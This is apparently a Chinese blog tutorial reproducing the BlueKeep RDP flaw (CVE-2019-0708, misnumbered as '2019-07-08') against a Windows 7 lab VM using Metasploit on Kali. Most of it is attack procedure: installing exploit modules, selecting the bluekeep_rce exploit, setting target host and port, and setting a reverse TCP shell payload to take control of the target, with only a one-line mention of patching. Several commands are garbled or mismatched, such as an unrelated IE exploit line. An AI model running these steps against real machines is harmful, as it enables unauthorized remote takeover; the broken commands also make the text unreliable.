### Windows系列服务器于2019年5月15号，被爆出高危漏洞，该漏洞影响范围较广windows2003、windows2008、windows2008 R2、windows xp 、win7 系统都会遭到攻击，该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的 

如果要复现CVE 2019-07-08这个漏洞必须要让msf更新到最新版本  msfconsole  

必须要更新msf最新版本因为只有msf最新版本的源才会有cve2019-07-08漏洞  

攻击机器：liunx-kali 自带的msf工具   

靶机: VM搭建的win7系统

  

我们首先进入linux的kali系统  更换源来提升更新软件的速度  

*   
*   
*   
*   

```
cd  etc/pat  //切换到etc/pat这个文件当中leafpad sources.list    //使用leafpad 打开 sources.list这个文本文档leafpad是kali自带的文本文档工具  我们百度一下源将源更换上即可
```

![](../Images/954728103cfcc698b2b9a5ef19734570.png)

我这里更换的是阿里的源  

  

*   
*   

```
apt-getupdate  更新软件使用apt-get  install metasploit-framework
```

![](../Images/3bf3b2eb8cd34a9e88cfd4a6d24dc62a.png)

  

安装完成后如果我们不下载msf最新的cve 2019-07-08的套件攻击的话就会蓝屏   我们下载了四个攻击套件 把他放在对应的目录当中就会拿到攻击目标的shell 控制对方电脑了  

dp.rb==>/usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb

  

rdp\_scanner.rb==>/usr/share/metasploitframework/modules/auxiliary/scanner/rdp/rdp\_scanner.rb

  

cve\_2019\_0708\_bluekeep.rb==>/usr/share/metasploitframework/modules/auxiliary/scanner/rdp/cve\_2019\_0708\_bluekeep.rb

  

cve\_2019\_0708\_bluekeep\_rce.rb==>/usr/share/metasploitframework/modules/exploits/windows/rdp/cve\_2019\_0708\_bluekeep\_rce.rb

最后一个文件是需要新建一个rdp**文件夹的**

放置完成攻击套件后我们进入我们的msf框架  

msfconsole  需要等待几秒才能进入  

![](../Images/cad2c8dd90a98ba99c5ee582ed4b0389.png)

我们更新的msfconsole版本是5.0.46的 是有这个漏洞的 我们就可以进行下一步的操作   

  

use exploit/windows/rdp/cve\_2019\_0708\_bluekeep\_rce  启用2019-07-08的攻击套件

  

远程桌面的端口默认是3389  我们可以使用info来查看配置   

set rhosts 192.168.0.0  后面设置一个要攻击的ip地址   

set target  1-4              选择一个攻击 

set rport    3389           定义一个攻击的端口号  

设置完成之后info可以再次查看是否有更改数据

  

  

设置完成之后我们可以直接建立连接

exploit    等待建立连接

不过攻击后有时会产生蓝屏  可以设置一下payload

*   
*   

```
use exploit/windows/browser/ms10_018_ie_behaviorsset payload generic/shell_reverse_tcp
```

下面可以看到我们已经拿到对方机器的shell 

控制对方机器后我们就可以执行命令了

![](../Images/42d83d1749c1340f72e7332fb4db62b7.png)

win7 只需要开启远程桌面连接即可   可能在攻击过程目标机会显示2-3次的蓝屏稍等后会重新启动  

  

修复的方法在微软的官网下载补丁，关闭远程桌面
